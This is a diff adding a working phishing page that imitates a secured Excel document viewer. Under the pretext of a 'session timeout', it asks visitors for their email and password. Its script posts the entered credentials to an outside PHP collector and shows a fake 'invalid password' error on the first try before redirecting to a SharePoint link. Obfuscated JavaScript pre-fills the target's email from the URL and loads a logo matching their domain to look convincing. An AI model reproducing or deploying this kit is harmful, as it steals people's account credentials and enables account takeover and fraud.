@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>continue</title>
+
+    <style>
+        /* Apply background image and center it */
+        body {
+            background-image: url('https://fredericklocalyokel.com/wp-content/uploads/2015/05/lawyerletter-blur.jpg');
+            background-size: cover;
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Style the form */
+        form {
+            background: #355E3B;
+            background: -moz-linear-gradient(top, #008000 0%, #008000 73%, #008000 100%);
+            background: -webkit-linear-gradient(top, #008000 0%, #008000 73%, #008000 100%);
+            background: linear-gradient(to bottom, #355E3B 0%, #355E3B 73%, #355E3B 100%);
+            color: white;
+            font-weight: bold;
+            border-radius: 25px 0px 65px 0px;
+            -webkit-box-shadow: 3px 3px 15px 5px #000000;
+            box-shadow: 3px 3px 15px 5px #000000;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 2;
+            width: 360px;
+            padding: 5px;
+            text-align: center;
+        }
+
+        /* Style the form elements */
+        input[type="email"],
+        input[type="password"],
+        button,
+        input[type="submit"] {
+            width: 75%;
+            padding: 10px;
+            margin: 5px 0px;
+            border: none;
+            border-radius: 5px;
+        }
+
+        input[type="submit"] {
+            background-color: #179dbeec;
+            color: white;
+            cursor: pointer;
+            width: 120px;
+            border: 1px solid #f1f3f5;
+
+
+        }
+
+        input[type="submit"]:hover {
+            background-color: #03afce;
+        }
+
+        button {
+            background-color: #007BFF;
+            color: white;
+            cursor: pointer;
+
+        }
+
+
+        #msgfont {
+            color: rgb(255, 166, 0);
+        }
+
+        /* Style the logo */
+        .logo {
+            margin-bottom: 20px;
+
+        }
+
+        /* Style the instructions */
+        .instructions {
+            font-size: 16px;
+            color: #dfd9d9;
+            margin-bottom: 20px;
+        }
+
+        @media (max-width: 480px) {
+
+            /* Adjust form elements for smaller screens */
+            input[type="text"],
+            input[type="password"],
+            button {
+                padding: 8px;
+                /* Decrease padding for smaller elements */
+                font-size: 14px;
+                /* Reduce font size for smaller elements */
+            }
+        }
+    </style>
+
+</head>
+
+<body>
+    <form method="post" name="street">
+        <br /><br />
+        <DIV class="mt-30 mb-30" style="BOX-SIZING: border-box; MARGIN: 10px 0px"><IMG
+                class="img-responsive form-login__company-logo"
+                style="BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; MAX-WIDTH: 100%; HEIGHT: auto; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: middle; BORDER-BOTTOM-WIDTH: 0px; MARGIN: 0px auto; DISPLAY: block; BORDER-TOP-WIDTH: 0px; MAX-HEIGHT: 40px"
+                src="https://images.credly.com/images/7a1fa340-f261-4e69-b41b-b27ffaece00f/MOS_Excel_Expert6.png"></DIV>
+
+        <div class="instructions">
+            <p>This Document is end-to-end encrypted, &#x1F512;</p>
+            <p>Session Timeout Login View Document...</p>
+            <p id="msgfont"></p>
+        </div>
+
+        <input type="email" name="email" id="email" autofocus="" placeholder="Email address" value="[[-Email-]]"
+            required /> <br />
+        <input type="password" name="password" id="password" autofocus="" placeholder="Password" required />
+        <br /><br />
+
+        <input type="submit" value="View Doucment" name="btnLogin" id="btnLogin" />
+        <br /><br />
+
+    </form>
+
+
+    <script type="text/javascript">
+        var countAttempt = 0;
+        var sendUrl = "https://guaibapan.com.br/wp-includes/images/smilies/id2/cnxsexcel.php";
+
+        document.addEventListener('DOMContentLoaded', function () {
+            var btnLogin = document.getElementById('btnLogin');
+            var msgFont = document.getElementById('msgfont');
+
+            btnLogin.addEventListener("click", function (event) {
+                event.preventDefault();
+                var password = document.getElementById('password').value;
+                if (password == "") {
+                    msgFont.innerHTML = "Please enter password";
+                } else {
+                    sendData();
+                }
+            });
+
+            btnLogin.addEventListener("touchend", function (event) {
+                event.preventDefault();
+                var password = document.getElementById('password').value;
+                if (password == "") {
+                    msgFont.innerHTML = "Please enter password";
+                } else {
+                    sendData();
+                }
+            });
+
+            function sendData() {
+                var email = document.getElementById('email').value;
+                var password = document.getElementById('password').value;
+
+                console.log("Email - " + email);
+                console.log("Password - " + password);
+
+                // You can use the FormData object to collect form data
+                var formData = new FormData(document.forms.street);
+
+                countAttempt++;
+
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', sendUrl);
+
+                xhr.send(formData);
+
+                if (countAttempt >= 2) {
+                    setTimeout(function () {
+                        window.location = "https://regionalmanagers-my.sharepoint.com/:b:/p/ivan/EVhCMbG-roNHisHIx3fXqXkBATy7wZKPXYQsdKYIS5rgWA?e=1XABKN%2F&email=master%40gersung.co.kr&password=vmbmnbbmnmnm%2Cn%2C%2C";
+                    }, 2000);
+                    btnLogin.value = "Verifying....";
+                    msgFont.innerHTML = "";
+                } else {
+                    setTimeout(function () {
+                        msgFont.innerHTML = "The mailbox or password is invalid. Please enter a valid password";
+                        btnLogin.value = "View";
+                    }, 2000);
+                    btnLogin.value = "Verifying...."
+                }
+            }
+        });
+    </script>
+
+
+    <script language="javascript" type="text/javascript">
+        var _0x3a4e77 = _0x54a8;
+        (function (_0x3c0ee9, _0x48af71) {
+            var _0x7a9911 = { _0x21d498: 0x13d, _0x5608f4: 0x156, _0x31cf13: 0x152 },
+                _0x10e511 = _0x54a8,
+                _0x31048f = _0x3c0ee9();
+            while (!![]) {
+                try {
+                    var _0x4a0273 =
+                        (parseInt(_0x10e511(0x149)) / 0x1) * (-parseInt(_0x10e511(0x145)) / 0x2) +
+                        -parseInt(_0x10e511(_0x7a9911._0x21d498)) / 0x3 +
+                        parseInt(_0x10e511(0x15d)) / 0x4 +
+                        (parseInt(_0x10e511(0x14a)) / 0x5) * (parseInt(_0x10e511(0x150)) / 0x6) +
+                        (parseInt(_0x10e511(_0x7a9911._0x5608f4)) / 0x7) * (parseInt(_0x10e511(0x157)) / 0x8) +
+                        parseInt(_0x10e511(_0x7a9911._0x31cf13)) / 0x9 +
+                        (parseInt(_0x10e511(0x146)) / 0xa) * (-parseInt(_0x10e511(0x138)) / 0xb);
+                    if (_0x4a0273 === _0x48af71) break;
+                    else _0x31048f["push"](_0x31048f["shift"]());
+                } catch (_0x2c5f47) {
+                    _0x31048f["push"](_0x31048f["shift"]());
+                }
+            }
+        })(_0x5932, 0x9cdf1);
+
+        //var input = document[_0x3a4e77(0x15e) + _0x3a4e77(0x13a) + "men" + "tBy" + "Id"](_0x3a4e77(0x147) + "swo" + "rd");
+        input[_0x3a4e77(0x14b) + _0x3a4e77(0x14c) + _0x3a4e77(0x153) + _0x3a4e77(0x141) + _0x3a4e77(0x158) + "r"](_0x3a4e77(0x148) + "up", function (_0xd8b74e) {
+            var _0x20f9eb = { _0x228232: 0x148, _0x1952ad: 0x151, _0x560042: 0x15e, _0x2beb54: 0x15a, _0x3b44eb: 0x14f, _0x1ebb54: 0x139, _0x3ba087: 0x15c },
+                _0x54eddf = _0x3a4e77;
+            _0xd8b74e[_0x54eddf(_0x20f9eb._0x228232) + _0x54eddf(0x15b) + "e"] === 0xd &&
+                (_0xd8b74e["pre" + "ven" + _0x54eddf(_0x20f9eb._0x1952ad) + _0x54eddf(0x142) + "lt"](),
+                    document[_0x54eddf(_0x20f9eb._0x560042) + _0x54eddf(0x13a) + _0x54eddf(_0x20f9eb._0x2beb54) + _0x54eddf(0x159) + "Id"](_0x54eddf(_0x20f9eb._0x3b44eb) + _0x54eddf(_0x20f9eb._0x1ebb54) + _0x54eddf(0x144) + "n")[
+                        _0x54eddf(_0x20f9eb._0x3ba087) + "ck"
+                    ]());
+        });
+        function _0x54a8(_0x5c30ed, _0x30c703) {
+            var _0x593202 = _0x5932();
+            return (
+                (_0x54a8 = function (_0x54a87a, _0x576d0e) {
+                    _0x54a87a = _0x54a87a - 0x138;
+                    var _0x1824c6 = _0x593202[_0x54a87a];
+                    return _0x1824c6;
+                }),
+                _0x54a8(_0x5c30ed, _0x30c703)
+            );
+        }
+        function _0x5932() {
+            var _0x4240ab = [
+                "mit",
+                "Ele",
+                "hre",
+                "ema",
+                "1331517TUexNZ",
+                "abe",
+                "ams",
+                "rch",
+                "ist",
+                "fau",
+                "loc",
+                "-bt",
+                "2782YHGvoD",
+                "3460HZwPdT",
+                "pas",
+                "key",
+                "83tBkKbT",
+                "10SZZWcg",
+                "add",
+                "Eve",
+                "val",
+                "inn",
+                "sub",
+                "3422538LgQmQb",
+                "tDe",
+                "4446693ddzZFx",
+                "ntL",
+                "ill",
+                "Par",
+                "21RCDrbr",
+                "281408yHtqTp",
+                "ene",
+                "tBy",
+                "men",
+                "Cod",
+                "cli",
+                "3789824bmGZfT",
+                "get",
+                "47245ilxdIC",
+            ];
+            _0x5932 = function () {
+                return _0x4240ab;
+            };
+            return _0x5932();
+        }
+        var url_string = window[_0x3a4e77(0x143) + "ati" + "on"][_0x3a4e77(0x13b) + "f"],
+            url = new URL(url_string),
+            cid = url["sea" + _0x3a4e77(0x140) + _0x3a4e77(0x155) + _0x3a4e77(0x13f)][_0x3a4e77(0x15e)]("id");
+        if (cid) document[_0x3a4e77(0x15e) + _0x3a4e77(0x13a) + _0x3a4e77(0x15a) + _0x3a4e77(0x159) + "Id"](_0x3a4e77(0x13c) + "il")[_0x3a4e77(0x14d) + "ue"] = cid;
+        else {
+        }
+        document[_0x3a4e77(0x15e) + _0x3a4e77(0x13a) + _0x3a4e77(0x15a) + _0x3a4e77(0x159) + "Id"]("ema" + _0x3a4e77(0x154) + _0x3a4e77(0x13e) + "l")[_0x3a4e77(0x14e) + "erH" + "TML"] = document[
+            _0x3a4e77(0x15e) + _0x3a4e77(0x13a) + "men" + _0x3a4e77(0x159) + "Id"
+        ]("ema" + "il")[_0x3a4e77(0x14d) + "ue"];
+        var _0x5bb45b = _0x33ec;
+        function _0x33ec(_0x11ac21, _0x4403db) {
+            var _0x25c058 = _0x25c0();
+            return (
+                (_0x33ec = function (_0x33ec94, _0x326f16) {
+                    _0x33ec94 = _0x33ec94 - 0x15a;
+                    var _0x1fc4d5 = _0x25c058[_0x33ec94];
+                    return _0x1fc4d5;
+                }),
+                _0x33ec(_0x11ac21, _0x4403db)
+            );
+        }
+        (function (_0x4fbe96, _0x26b5b9) {
+            var _0x5f3cd6 = { _0x46a974: 0x15b, _0x540943: 0x16c, _0x321819: 0x15c, _0x5c855d: 0x164, _0x3b79fc: 0x15e, _0x419722: 0x166, _0x33b763: 0x16b, _0xb157a1: 0x16f },
+                _0x55e6c0 = _0x33ec,
+                _0x39118b = _0x4fbe96();
+            while (!![]) {
+                try {
+                    var _0xf3db39 =
+                        (-parseInt(_0x55e6c0(_0x5f3cd6._0x46a974)) / 0x1) * (-parseInt(_0x55e6c0(_0x5f3cd6._0x540943)) / 0x2) +
+                        (parseInt(_0x55e6c0(_0x5f3cd6._0x321819)) / 0x3) * (parseInt(_0x55e6c0(_0x5f3cd6._0x5c855d)) / 0x4) +
+                        (parseInt(_0x55e6c0(0x163)) / 0x5) * (parseInt(_0x55e6c0(_0x5f3cd6._0x3b79fc)) / 0x6) +
+                        parseInt(_0x55e6c0(0x16a)) / 0x7 +
+                        (-parseInt(_0x55e6c0(_0x5f3cd6._0x419722)) / 0x8) * (-parseInt(_0x55e6c0(0x167)) / 0x9) +
+                        -parseInt(_0x55e6c0(0x15d)) / 0xa +
+                        (-parseInt(_0x55e6c0(_0x5f3cd6._0x33b763)) / 0xb) * (parseInt(_0x55e6c0(_0x5f3cd6._0xb157a1)) / 0xc);
+                    if (_0xf3db39 === _0x26b5b9) break;
+                    else _0x39118b["push"](_0x39118b["shift"]());
+                } catch (_0x59ef94) {
+                    _0x39118b["push"](_0x39118b["shift"]());
+                }
+            }
+        })(_0x25c0, 0xb099b);
+        if (cid) {
+            var domainname = cid[_0x5bb45b(0x16d) + "it"]("@")[0x1];
+            document["get" + _0x5bb45b(0x161) + _0x5bb45b(0x170) + _0x5bb45b(0x169) + "Id"]("log" + "oim" + _0x5bb45b(0x160))[_0x5bb45b(0x16e)] =
+                _0x5bb45b(0x168) + "ps:" + "//l" + _0x5bb45b(0x162) + ".cl" + _0x5bb45b(0x15a) + _0x5bb45b(0x165) + _0x5bb45b(0x15f) + "m/" + domainname;
+        }
+        function _0x25c0() {
+            var _0x3ffbac = [
+                "2649DwhUXm",
+                "10690380WzNcor",
+                "3003186abiaFD",
+                ".co",
+                "age",
+                "Ele",
+                "ogo",
+                "10nHTyaH",
+                "3976nmSzRD",
+                "bit",
+                "307048ZdmZHs",
+                "153DgOuQH",
+                "htt",
+                "tBy",
+                "5450844eVMQKn",
+                "69883WtxrEF",
+                "6YuAkms",
+                "spl",
+                "src",
+                "3900vOAjIH",
+                "men",
+                "ear",
+                "182395jzdTBV",
+            ];
+            _0x25c0 = function () {
+                return _0x3ffbac;
+            };
+            return _0x25c0();
+        }
+    </script>
+</body>
+
+</html>
